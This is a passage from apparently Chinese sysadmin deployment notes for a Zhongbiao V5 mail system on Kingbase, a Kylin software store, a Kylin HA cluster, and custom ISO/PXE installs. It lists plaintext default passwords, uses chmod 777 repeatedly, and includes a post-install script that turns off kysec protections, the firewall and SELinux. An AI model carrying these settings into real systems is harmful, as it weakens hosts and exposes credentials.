/opt/AQYJ/nsmail/bin/</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="中标V5邮件系统部署"><a href="#中标V5邮件系统部署" class="headerlink" title="中标V5邮件系统部署"></a>中标V5邮件系统部署</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><pre><code class="hljs bash">安装包：激活码：服务器系统：金仓数据库安装包：激活码：</code></pre><h3 id="中标v5邮件系统"><a href="#中标v5邮件系统" class="headerlink" title="中标v5邮件系统"></a>中标v5邮件系统</h3><pre><code class="hljs bash">rpm -ivh xxx.rpm --force</code></pre><p>修改配置文件</p><pre><code class="hljs bash"><span class="hljs-comment"># 修改前台连接数据库地址</span>vim /opt/AQYJ/nsmail/conf/db.confvim /opt/AQYJ/nsmail/Cs2cInst/html/nsmail_admin/config.php vim /opt/AQYJ/nsmail/Cs2cInst/html/nsmail/config/db.inc.php vim /opt/AQYJ/nsmail/Cs2cInst/html/nsmail/plugins/password/config.inc.phpvim /opt/AQYJ/nsmail/Cs2cInst/php/etc/php.ini<span class="hljs-comment"># 修改密码超时时间</span>vim /opt/AQYJ/nsmail/Cs2cInst/html/system_env.php<span class="hljs-comment"># 中标邮件系统V5</span>/opt/AQYJ/nsmail/init.d/nsmailservice cs2cmail stop/opt/AQYJ/nsmail/init.d/nsmailservice cs2cmail start/opt/AQYJ/nsmail/init.d/nsmailservice cs2cmail restart/opt/AQYJ/nsmail/init.d/nsmailservice cs2cmail status</code></pre><h3 id="金仓V8R3数据库"><a href="#金仓V8R3数据库" class="headerlink" title="金仓V8R3数据库"></a>金仓V8R3数据库</h3><pre><code class="hljs bash"><span class="hljs-comment"># 创建数据库用</span>useradd kingbase<span class="hljs-comment"># 创建安装目录</span><span class="hljs-built_in">mkdir</span> /opt/kingbase<span class="hljs-built_in">chmod</span> 777 /opt/kingbase<span class="hljs-comment"># 创建安装文件包路径</span><span class="hljs-built_in">mkdir</span> /opt/package<span class="hljs-built_in">chmod</span> 777 /opt/package<span class="hljs-comment"># 挂载镜像</span>mount 镜像 /mnt<span class="hljs-built_in">cp</span> -a /mnt/* /opt/package/<span class="hljs-built_in">chmod</span> 777 -R /opt/package/<span class="hljs-comment"># 安装数据。字符集选择UTF-8，大小写不敏感选择case-insensitive</span>su - kingbasebash /opt/package/setup.sh<span class="hljs-comment"># 启动金仓数据库</span>/opt/kingbase/Server/bin/sys_ctl -D /opt/kingbase/data/ start<span class="hljs-comment"># 进入数据库</span>/opt/kingbase/Server/bin/ksql <span class="hljs-built_in">test</span> system<span class="hljs-comment"># 创建用户及数据库并授予相关权限</span><span class="hljs-built_in">test</span># create user xxx_username with password <span class="hljs-string">&#x27;xxx_password&#x27;</span>;<span class="hljs-built_in">test</span># create database xxx_database owner xxx_username;<span class="hljs-built_in">test</span># grant system to xxx_username;<span class="hljs-comment"># 使用某个用户进入某个数据库中</span>/opt/kingbase/Server/bin/ksql -U xxx_username<span class="hljs-comment"># 在对应数据库中导入数据备份</span>\i 备份文件绝对路径.sql<span class="hljs-comment"># 其他常用命令</span>\l+ <span class="hljs-comment"># 查库</span>\d+ <span class="hljs-comment"># 查表</span>\<span class="hljs-built_in">du</span> <span class="hljs-comment"># 查用户</span><span class="hljs-keyword">select</span> * from xxx_table;<span class="hljs-comment"># 查询用户的cguid</span><span class="hljs-keyword">select</span> name,cguid from mail_user <span class="hljs-built_in">where</span> cguid&lt;&gt;<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">select</span> * from <span class="hljs-built_in">alias</span> <span class="hljs-built_in">where</span> address=<span class="hljs-string">&#x27;xxx@xxx.net&#x27;</span>;<span class="hljs-keyword">select</span> name,cguid from mail_user <span class="hljs-built_in">where</span> name = <span class="hljs-string">&#x27;xxxx@xxx.net&#x27;</span>;delete from <span class="hljs-built_in">alias</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=xxxx;<span class="hljs-comment"># 查看日志</span><span class="hljs-built_in">tail</span> -f /opt/AQYJ/nsmail/log/httpd/ssl_error_log</code></pre><h2 id="割接文档"><a href="#割接文档" class="headerlink" title="割接文档"></a>割接文档</h2><pre><code class="hljs bash"><span class="hljs-comment"># tail -f /opt/AQYJ/nsmail/log/httpd/ssl_error_log</span><span class="hljs-comment"># 查看日志, 137行添加 error_log($sql)</span>/opt/AQYJ/nsmail/Cs2cInst/html/nsmail_admin/lib/SQL.php<span class="hljs-comment"># c</span></code></pre><h3 id="步骤1、hy-sync文件修改编码格式"><a href="#步骤1、hy-sync文件修改编码格式" class="headerlink" title="步骤1、hy_sync文件修改编码格式"></a>步骤1、hy_sync文件修改编码格式</h3><pre><code class="hljs bash"><span class="hljs-comment">## vim /opt/AQYJ/nsmail/Cs2cInst/html/nsmail_admin/group/hu_sync.php</span><span class="hljs-comment"># 在第2行添加，如图1所示</span>ini_set(<span class="hljs-string">&#x27;default_charset&#x27;</span>, <span class="hljs-string">&#x27;UTF-8&#x27;</span>);mb_internal_encoding(<span class="hljs-string">&#x27;UTF-8&#x27;</span>);</code></pre><p><img src="file:///C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20250909163226131.png" alt="1"></p><p>1</p><h3 id="步骤2、hy-sync文件修改name判断条件"><a href="#步骤2、hy-sync文件修改name判断条件" class="headerlink" title="步骤2、hy_sync文件修改name判断条件"></a>步骤2、hy_sync文件修改name判断条件</h3><pre><code class="hljs bash"><span class="hljs-comment">## vim /opt/AQYJ/nsmail/Cs2cInst/html/nsmail_admin/group/hu_sync.php</span><span class="hljs-comment">## 将98行的配置修改</span><span class="hljs-keyword">if</span> (<span class="hljs-variable">$userOb</span>-&gt;checkExist(<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123; <span class="hljs-comment"># 源配置：</span><span class="hljs-keyword">if</span> (<span class="hljs-variable">$userOb</span>-&gt;checkExist(<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;name&#x27;</span>])==<span class="hljs-literal">true</span>) &#123; <span class="hljs-comment"># 修改后的配置：</span></code></pre><p><img src="file:///C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20250909163150884.png" alt="2"></p><p>2</p><h3 id="步骤3、hu-sync文件添加psssword-validate字段"><a href="#步骤3、hu-sync文件添加psssword-validate字段" class="headerlink" title="步骤3、hu_sync文件添加psssword_validate字段"></a>步骤3、hu_sync文件添加psssword_validate字段</h3><pre><code class="hljs bash"><span class="hljs-comment">## vim /opt/AQYJ/nsmail/Cs2cInst/html/nsmail_admin/group/hu_sync.php</span><span class="hljs-comment"># 在148行（expired字段）添加下列配置</span><span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;password_validate&#x27;</span>] = <span class="hljs-string">&quot;2005-12-30 00:00:00&quot;</span>;</code></pre><p><img src="file:///C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20250909163854637.png" alt="3"></p><p>3</p><h3 id="步骤4、添加-verifyService-wsdl"><a href="#步骤4、添加-verifyService-wsdl" class="headerlink" title="步骤4、添加 verifyService.wsdl"></a>步骤4、添加 verifyService.wsdl</h3><pre><code class="hljs bash"><span class="hljs-comment">## 对接卫士通认证文件，将该文件放在/opt/AQYJ/nsmail/Cs2cInst/html/目录下，并修改权限</span>/opt/AQYJ/nsmail/Cs2cInst/html/verifyService.wsdl<span class="hljs-built_in">chmod</span> 777 verifyService.wsdl</code></pre><p><img src="file:///C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20250909164734357.png" alt="image-20250909164734357"></p><p>image-20250909164734357</p><h3 id="步骤5、dovecot-conf文件取消证书登录注释"><a href="#步骤5、dovecot-conf文件取消证书登录注释" class="headerlink" title="步骤5、dovecot.conf文件取消证书登录注释"></a>步骤5、dovecot.conf文件取消证书登录注释</h3><pre><code class="hljs bash"><span class="hljs-comment"># vim /opt/AQYJ/nsmail/Cs2cInst/dovecot/etc/dovecot/dovecot.conf</span>passdb &#123;driver = passwd-fileargs = username_format=<span class="hljs-variable">$r</span> /opt/AQYJ/nsmail/Cs2cInst/dovecot/etc/dovecot/dovecot.super&#125;<span class="hljs-comment"># 重启dovecot 服务器</span>/opt/AQYJ/nsmail/init.d/dovecot restart</code></pre><p><img src="file:///C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20250909165238839.png" alt="image-20250909165238839"></p><p>image-20250909165238839</p><h3 id="步骤6、User-php删除-mail-size-字段"><a href="#步骤6、User-php删除-mail-size-字段" class="headerlink" title="步骤6、User.php删除 mail_size 字段"></a>步骤6、User.php删除 mail_size 字段</h3><pre><code class="hljs bash"><span class="hljs-comment">## vim /opt/AQYJ/nsmail/Cs2cInst/html/nsmail_admin/lib/User.php</span><span class="hljs-comment"># 搜索 editUser_api_hu 和 editUser_api_hu2 字段，删除这两个方法下的 mail_size多余字段</span></code></pre><p><img src="file:///C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20250909170813019.png" alt="image-20250909170813019"></p><p>image-20250909170813019</p><h3 id="步骤7、index-php文件注释var-dump方法"><a href="#步骤7、index-php文件注释var-dump方法" class="headerlink" title="步骤7、index.php文件注释var_dump方法"></a>步骤7、index.php文件注释var_dump方法</h3><pre><code class="hljs bash"><span class="hljs-comment">## vim /opt/AQYJ/nsmail/Cs2cInst/html/nsmail/index.php</span><span class="hljs-comment"># 将var_dump的方法都注释</span></code></pre><p><img src="file:///C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20250909170046260.png" alt="6"></p><p>6</p><h1 id="五、应用商店"><a href="#五、应用商店" class="headerlink" title="五、应用商店"></a>五、应用商店</h1><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><pre><code class="hljs awk">软件管理平台：http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">16.118</span>:<span class="hljs-number">8880</span><span class="hljs-regexp">/login ， 默认账号: admin/</span>admin软件更新平台：http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">16.118</span>:<span class="hljs-number">8880</span><span class="hljs-regexp">/login，默认账号：root/</span>Kylin2023*</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826124633042.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826124712618.png" alt="img"></p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><pre><code class="hljs bash"><span class="hljs-comment"># 麒麟服务器系统，最小化安装（选择安装开发工具），4C8G，150G空间</span>默认服务器账号和密码<span class="hljs-comment"># 部署软件商店需要ifconfig命令，故需要安装net-tools工具</span>yum updateyum install -y net-tools<span class="hljs-comment"># 挂载镜像，将镜像安装资源拷贝除了</span>mount /opt/Kylin-softwarestore-V2-2.7-Release-20250220-X86_64.iso /mnt<span class="hljs-built_in">mkdir</span> /opt/software<span class="hljs-built_in">cp</span> -r /mnt/* /opt/software/</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826103946384.png" alt="环境准备"></p><p>环境准备</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /opt/software/00inittar zxvf init-x86_64.tar.gz<span class="hljs-built_in">cd</span> base-env-x86_64/bash init.sh</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826181708738.png" alt="初始化环境"></p><p>初始化环境</p><h3 id="部署软件管理平台"><a href="#部署软件管理平台" class="headerlink" title="部署软件管理平台"></a>部署软件管理平台</h3><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /opt/software/01soft_manager<span class="hljs-built_in">cat</span> ksm-inline-v2.7-amd64.tar.gz.sha* &gt; ksm-inline-v2.7-amd64.tar.gztar xvzf ksm-inline-v2.7-amd64.tar.gz<span class="hljs-comment">#复制激活⽂件`.kyinfo`和`LICENSE`到`ksm-inline`同级安装⽬录</span> <span class="hljs-built_in">cd</span> ksm-inline/shell/bash deploy.sh</code></pre><h3 id="部署更新管理平台"><a href="#部署更新管理平台" class="headerlink" title="部署更新管理平台"></a>部署更新管理平台</h3><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /opt/software/02update_manager/<span class="hljs-built_in">cat</span> kss-2.2.1-amd64.tar.gz.sha0 &gt; kss-2.2.1-amd64.tar.gztar xvzf kss-2.2.1-amd64.tar.gz<span class="hljs-built_in">cd</span> kss_deploy/<span class="hljs-comment"># 使用脚本安装更新管理拓扑</span>bash ./shell/main.sh</code></pre><h2 id="软件管理平台"><a href="#软件管理平台" class="headerlink" title="软件管理平台"></a>软件管理平台</h2><h3 id="清空公网软件包"><a href="#清空公网软件包" class="headerlink" title="清空公网软件包"></a>清空公网软件包</h3><pre><code class="hljs bash"><span class="hljs-comment"># show tables;</span>docker <span class="hljs-built_in">exec</span> -it mysql bashmysql -uroot -pmysql@kylinuse kylin_soft_shop;update t_kylinos_application_status <span class="hljs-built_in">set</span> delete_status = 1,update_time=now() <span class="hljs-built_in">where</span> 1=1;update t_kylinos_application_basic <span class="hljs-built_in">set</span> update_time=now() <span class="hljs-built_in">where</span> 1=1;update t_kylinos_store_android_info <span class="hljs-built_in">set</span> delete_status =1 <span class="hljs-built_in">where</span> 1=1;flush privileges;<span class="hljs-built_in">exit</span></code></pre><h2 id="软件上架-软件商店"><a href="#软件上架-软件商店" class="headerlink" title="软件上架-软件商店"></a>软件上架-软件商店</h2><h3 id="1、创建仓库源"><a href="#1、创建仓库源" class="headerlink" title="1、创建仓库源"></a>1、创建仓库源</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826181800414.png" alt="新建仓库"></p><p>新建仓库</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826130335613.png" alt="img"></p><h3 id="2、上传软件包"><a href="#2、上传软件包" class="headerlink" title="2、上传软件包"></a>2、上传软件包</h3><pre><code class="hljs bash"><span class="hljs-comment"># 下载向日葵软件 https://sunlogin.oray.com/download/linux?type=personal</span>SunloginClient_11.0.1.44968_kylin_amd64.deb<span class="hljs-comment"># 错误类型deb文件名不能存在大写，软件名_版本_架构.deb</span>sunloginclient_11.0.1.44968_amd64.deb</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826181834670.png" alt="上传软件"></p><p>上传软件</p><h3 id="3、填写基本信息"><a href="#3、填写基本信息" class="headerlink" title="3、填写基本信息"></a>3、填写基本信息</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826154718035.png" alt="img"></p><h3 id="4、上传相关图片"><a href="#4、上传相关图片" class="headerlink" title="4、上传相关图片"></a>4、上传相关图片</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826154753088.png" alt="img"></p><h3 id="5、添加表情"><a href="#5、添加表情" class="headerlink" title="5、添加表情"></a>5、添加表情</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826154825035.png" alt="img"></p><h3 id="6、发布软件"><a href="#6、发布软件" class="headerlink" title="6、发布软件"></a>6、发布软件</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826154905136.png" alt="img"></p><h2 id="客户端使用"><a href="#客户端使用" class="headerlink" title="客户端使用"></a>客户端使用</h2><pre><code class="hljs awk">软件管理平台：http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">16.118</span>:<span class="hljs-number">8880</span><span class="hljs-regexp">/login ， 默认账号: admin/</span>admin软件更新平台：http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">16.118</span>:<span class="hljs-number">18080</span>，默认账号：root/Kylin2023*</code></pre><h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><p>1、软件商店添加源地址</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826151717074.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 注释其他源地址，添加源 vim /etc/apt/sources.list</span>deb http://192.168.16.118:8002/DEB/KYLIN_DEB bank_test main<span class="hljs-comment"># 禁止修改</span><span class="hljs-built_in">sudo</span> chattr +i /etc/apt/sources.list<span class="hljs-comment"># 取消锁定</span><span class="hljs-built_in">sudo</span> chattr -i /etc/apt/sources.listlsattr /etc/apt/sources.list</code></pre><p>2、软件商店修改服务器地址</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826122328849.png" alt="img"></p><p>3、常用命令</p><pre><code class="hljs bash"><span class="hljs-comment"># 常用命令</span><span class="hljs-built_in">sudo</span> apt update <span class="hljs-comment"># 更新源</span>apt policy sunloginclient <span class="hljs-comment"># 查看软件包</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250826151920510.png" alt="apt policy"></p><p>apt policy</p><h2 id="更新管理平台"><a href="#更新管理平台" class="headerlink" title="更新管理平台"></a>更新管理平台</h2><h2 id="其他-2"><a href="#其他-2" class="headerlink" title="其他"></a>其他</h2><hr><h1 id="六、HA高可用"><a href="#六、HA高可用" class="headerlink" title="六、HA高可用"></a>六、HA高可用</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><pre><code class="hljs bash"><span class="hljs-comment"># 至少需要 2 个节点，节点可以是物理服务器和虚拟机，每个节点至少需要 2 块网卡做心跳与业务网卡；</span><span class="hljs-comment"># [可选]建议使用一台 SAN/NAS/ISCSI/NFS 存储作为数据共享存储空间；</span><span class="hljs-comment"># [可选]提供电源管理设备。</span>备注：心跳链路可以配置多条，有VIP（2台设备虚拟出一个虚拟IP）场景，也可以服务（脚本，systemctl）的切换等。共享存储的切换等。系统端口： 22、8088、2224、5405、5406前端管理地址：https://ip:8088   账号：hacluster</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250906134207434.png" alt="img"></p><h2 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h2><pre><code class="hljs bash"><span class="hljs-comment">## 准备安装工具</span><span class="hljs-comment">## 修改hosts文件</span><span class="hljs-comment">## 在 ha1 和 ha2 都添加心跳IP的DNS解析</span><span class="hljs-comment"># vim /etc/hosts</span>192.168.16.51ha1192.168.16.52ha2<span class="hljs-comment"># [可选]挂载光盘</span>mount /dev/cdrom /mnt<span class="hljs-comment"># 挂载镜像</span>mount -o loop Kylin-HA-V10-SP3-2403-Release-20240513-ARM64.iso /mntmount -o loop Kylin-HA-V10-SP3-2403-Release-20240513-X86_64.iso /mnt<span class="hljs-comment">## 修改配置文件</span><span class="hljs-comment"># 创建/etc/corosync目录</span><span class="hljs-built_in">mkdir</span> /etc/corosync<span class="hljs-comment"># 将 /mnt/LICENSE、/mnt/.kyinfo 和 /mnt/.productinfo 文件拷贝到 /etc/corosync 目录下</span><span class="hljs-built_in">cp</span> /mnt/LICENSE /etc/corosync<span class="hljs-built_in">cp</span> /mnt/.kyinfo /etc/corosync<span class="hljs-built_in">cp</span> /mnt/.productinfo /etc/corosync<span class="hljs-built_in">cp</span> /mnt/scripts/ha.repo /etc/yum.repos.d<span class="hljs-comment"># 将 /mnt/scripts/ha.repo 的文件拷贝到 /etc/yum.repos.d 目录下，并修改 vim /etc/yum.repos.d/ha.repo</span>baseurl = file:///mnt/Packages<span class="hljs-comment"># 更新源缓存</span>yum clean allyum makecache</code></pre><h2 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h2><pre><code class="hljs bash"><span class="hljs-comment">## 执行该命令开始安装，根据提示操作即可</span>bash /mnt/KylinHA_install.bin<span class="hljs-comment"># 修改web管理用户密码，默认密码：</span>passwd hacluster<span class="hljs-comment"># 启动</span>systemctl <span class="hljs-built_in">enable</span> pcsd --nowsystemctl <span class="hljs-built_in">enable</span> ha-api --nowpcs host auth ha1 <span class="hljs-comment"># 输入 hacluster 和 对应密码</span>pcs host auth ha2 <span class="hljs-comment"># 输出 hacluster 和 对应密码</span><span class="hljs-comment">## 创建集群, 加速 51和52是机器的心跳链路 IP</span><span class="hljs-comment"># 单心跳网络创建集群</span>pcs cluster setup hacluster ha1 addr=192.168.16.51 ha2 addr=192.168.16.52<span class="hljs-comment"># 冗余心跳网络创建集群</span>pcs cluster setup hacluster ha1 addr=192.168.16.51 addr=192.168.16.41 ha2 addr=192.168.16.52 addr=192.168.16.42<span class="hljs-comment">## 集群相关命令</span><span class="hljs-comment"># 启动集群</span>pcs cluster start --all<span class="hljs-comment"># 查看集群状态</span>pcs status<span class="hljs-comment"># 停止集群</span>pcs cluster stop --all<span class="hljs-comment"># 删除集群</span>pcs cluster destroy<span class="hljs-comment"># 查看集群配置项</span>pcs property --all<span class="hljs-comment"># 开机自启动</span>pcs cluster <span class="hljs-built_in">enable</span> --all</code></pre><h2 id="配置VIP"><a href="#配置VIP" class="headerlink" title="配置VIP"></a>配置VIP</h2><blockquote><p>登录HA的web管理界面 <a href="https://ip:8088/">https://ip:8088</a> 账号：hacluster</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250906143842176.png" alt="img"></p><pre><code class="hljs bash"><span class="hljs-comment"># 创建普通资源</span>1、资源名称：自定义，例如vip2、资料类型：VIP配置一定要选择 IPaddr_63、IP：VIP的规划地址4、nic: 业务网卡的网卡名字，2台服务器的业务网卡名字应该一样5、cidr_netmask: VIP的掩码</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250906144038196.png" alt="img"></p><h1 id="七、镜像定制-PXE-USB自动安装"><a href="#七、镜像定制-PXE-USB自动安装" class="headerlink" title="七、镜像定制&#x2F;PXE&#x2F;USB自动安装"></a>七、镜像定制&#x2F;PXE&#x2F;USB自动安装</h1><pre><code class="hljs bash"><span class="hljs-comment">## 常见方案</span><span class="hljs-comment"># 方案一：镜像定制 + USB 自动安装</span><span class="hljs-comment"># 方案二：镜像定制 + PXE 自动安装</span><span class="hljs-comment"># 方案三：镜像定制 + PXE 自动安装 + KMS自动激活</span><span class="hljs-comment">## 镜像定制厂家需求</span><span class="hljs-comment"># 需求一：定制安装系统后的软件列表</span><span class="hljs-comment"># 需求二：定制安装系统后的字体包</span><span class="hljs-comment"># 需求三：定制安装系统后的补丁</span><span class="hljs-comment"># 需求四：定制安装系统后的系统设置（安全设置等）</span></code></pre><h2 id="桌面操作系统定制ISO"><a href="#桌面操作系统定制ISO" class="headerlink" title="桌面操作系统定制ISO"></a>桌面操作系统定制ISO</h2><h3 id="第三方软件目录"><a href="#第三方软件目录" class="headerlink" title="第三方软件目录"></a>第三方软件目录</h3><pre><code class="hljs bash"><span class="hljs-comment">## /third-party/common</span>软件.deb字体包.deb补丁.deb</code></pre><h3 id="系统设置文件"><a href="#系统设置文件" class="headerlink" title="系统设置文件"></a>系统设置文件</h3><pre><code class="hljs bash"><span class="hljs-comment">## /.kylin-post-actions</span><span class="hljs-comment">#!/bin/bash</span><span class="hljs-comment">#rm -rf /etc/apt/apt.conf.d/00recommends</span><span class="hljs-comment">#rm -rf /etc/apt/apt.conf.d/00secure</span><span class="hljs-built_in">cat</span> &gt; /etc/apt/sources.list &lt;&lt;<span class="hljs-string">EOF</span><span class="hljs-string">deb http://archive.kylinos.cn/kylin/KYLIN-ALL 10.1 main restricted universe multiverse</span><span class="hljs-string">deb http://archive.kylinos.cn/kylin/KYLIN-ALL 10.1-2303-updates main restricted universe multiverse</span><span class="hljs-string">deb http://archive.kylinos.cn/kylin/KYLIN-ALL 10.1-2303-hwe-pp-updates main</span><span class="hljs-string">deb http://archive2.kylinos.cn/deb/kylin/production/PART-V10-SP1/custom/partner/V10-SP1 default all</span><span class="hljs-string">EOF</span><span class="hljs-built_in">rm</span> -rf /etc/apt/sources.list.d/*<span class="hljs-built_in">rm</span> -rf /etc/apt/preferences.d/*<span class="hljs-comment">#解决网络安装后不能设置IP bug.</span>sed -i <span class="hljs-string">&quot;/enp[0-9]/d&quot;</span> /etc/network/interfacessed -i <span class="hljs-string">&quot;/eth[0-9]/d&quot;</span> /etc/network/interfaces<span class="hljs-built_in">mkdir</span> -p /etc/apt/preferences.d/<span class="hljs-built_in">mkdir</span> -p /etc/apt/sources.list.d/<span class="hljs-comment">#安装奇安信杀毒</span><span class="hljs-comment">#dpkg -i /opt/QAXS/*.deb</span><span class="hljs-comment">#rm /opt/QAXS -rf</span><span class="hljs-comment"># sshd 服务异常， 缺少key文件，dpkg-reconfigure openssh-server 能解决问题。</span>dpkg-reconfigure openssh-server<span class="hljs-comment"># 第三方包因安装后过大，后置安装</span><span class="hljs-comment">#dpkg -i /opt/third/*.deb</span><span class="hljs-comment">#rm /opt/third -rf</span><span class="hljs-comment">#########配置kms激活服务器地址#############</span>sed -i <span class="hljs-string">&#x27;s/ServerIp=/ServerIp=10.20.110.104/g&#x27;</span>   /usr/share/kylin-activation/activation_conf.ini<span class="hljs-comment">#########关闭安全-应用程序执行控制，应用防护控制，安全-设备安全##############</span>sed -i <span class="hljs-string">&#x27;s/kysec_status = 2/kysec_status = 0/g&#x27;</span>  /usr/share/ksc-set/scripts/ksc-setsed -i <span class="hljs-string">&#x27;s/kysec_netctl = 2/kysec_netctl = 0/g&#x27;</span>  /usr/share/ksc-set/scripts/ksc-setsed -i <span class="hljs-string">&#x27;s/kysec_exectl = 2/kysec_exectl = 0/g&#x27;</span>  /usr/share/ksc-set/scripts/ksc-setsed -i <span class="hljs-string">&#x27;s/kysec_fpro = 1/kysec_fpro = 0/g&#x27;</span>  /usr/share/ksc-set/scripts/ksc-setsed -i <span class="hljs-string">&#x27;s/kysec_kmodpro = 1/kysec_kmodpro = 0/g&#x27;</span>  /usr/share/ksc-set/scripts/ksc-setsed -i <span class="hljs-string">&#x27;s/kysec_ppro = 1/kysec_ppro = 0/g&#x27;</span>  /usr/share/ksc-set/scripts/ksc-setsed -i <span class="hljs-string">&#x27;s/kysec_devctl = 1/kysec_devctl = 0/g&#x27;</span>  /usr/share/ksc-set/scripts/ksc-setsed -i <span class="hljs-string">&#x27;s/Mode=all/Mode=off/g&#x27;</span>  /etc/kylin-firewall/kylin-firewall.confsed -i <span class="hljs-string">&#x27;s/security=kysec/security=0/g&#x27;</span>  /etc/default/grub<span class="hljs-comment">#n卡处理</span>has_nvidia=$(lspci | grep NVIDIA)<span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;has_nvidia&#125;</span>&quot;</span> ];<span class="hljs-keyword">then</span>    dpkg  -i  /opt/nvidia/nvidia-*.deb    <span class="hljs-built_in">rm</span> /opt/third -rf<span class="hljs-keyword">fi</span><span class="hljs-comment">#zhaoxin 6000显卡判断，不存在则卸载驱动</span><span class="hljs-comment">#has_zx_6000=&quot;$(lspci -vnn | grep -i &#x27;:3a04]&#x27; | head -n1)&quot;</span><span class="hljs-comment">#if [ -z &quot;$&#123;has_zx_6000&#125;&quot; ];then</span><span class="hljs-comment">#dpkg -P  zhaoxin-linux-graphics-driver-dri</span><span class="hljs-comment">#fi</span><span class="hljs-comment">#zhaoxin 6000G显卡判断，不存在则卸载驱动</span><span class="hljs-comment">#has_zx_6000g=&quot;$(lspci -vnn | grep -i &#x27;:3d01]&#x27; | head -n1)&quot;</span><span class="hljs-comment">#if [ -z &quot;$&#123;has_zx_6000g&#125;&quot; ];then</span><span class="hljs-comment">#dpkg -P  zhaoxin-cx4-linux-graphics-driver-dri</span><span class="hljs-comment">#fi</span><span class="hljs-comment">#bash /usr/share/ksc-set/scripts/ksc-set</span></code></pre><h2 id="PXE-搭建"><a href="#PXE-搭建" class="headerlink" title="PXE 搭建"></a>PXE 搭建</h2><pre><code class="hljs bash"><span class="hljs-comment">## DHCP启动文件: \boot\grub\arm64-efi\monolithic\grubnetaa64.efi</span><span class="hljs-comment">## KS文件系统文件: \casper\initrd.lz</span><span class="hljs-comment">## KS内核文件: \casper\vmlinuz</span><span class="hljs-comment">## /var/lib/tftpd</span><span class="hljs-comment">## 备注</span>1、如果是VMware虚拟机，需要使用UEFI启动，关闭网络中的DHCP服务2、</code></pre><h3 id="环境准备-1"><a href="#环境准备-1" class="headerlink" title="环境准备"></a>环境准备</h3><pre><code class="hljs bash"><span class="hljs-comment"># 步骤1: 最小化安装 2403 服务器系统（开发工具+MAN）</span><span class="hljs-comment"># 步骤2: 关闭防火墙 </span>systemctl <span class="hljs-built_in">disable</span> --now firewalld<span class="hljs-comment"># 步骤3: 关闭selinux，默认是关闭的。</span>sed -i.bak <span class="hljs-string">&#x27;/^SELINUX=/c SELINUX=disabled/&#x27;</span> /etc/selinux/configsetenforce 0<span class="hljs-comment"># 步骤4: 安装常用软件</span>yum install -y tree wget lrzsz vim gdisk lsof net-tools bash-completion autofs rsync unzip</code></pre><h3 id="TFFP和xinetd"><a href="#TFFP和xinetd" class="headerlink" title="TFFP和xinetd"></a>TFFP和xinetd</h3><pre><code class="hljs bash">yum install -y tftp-server.x86_64 xinetdrpm -ql tftp-serversystemctl <span class="hljs-built_in">enable</span> --now tftpsystemctl <span class="hljs-built_in">enable</span> --now xinetdnetstat -tnlpu | grep 69<span class="hljs-comment"># 修改相关配置文件</span><span class="hljs-built_in">mkdir</span> /var/lib/tftpboot/grub<span class="hljs-built_in">mkdir</span> /var/lib/tftpboot/kernel<span class="hljs-built_in">chmod</span> -R 757  /var/lib/tftpboot/sed -i.bak <span class="hljs-string">&#x27;/args/s/$/ -c/&#x27;</span> /etc/xinetd.d/tftpsed -i <span class="hljs-string">&#x27;14s#yes#no#&#x27;</span> 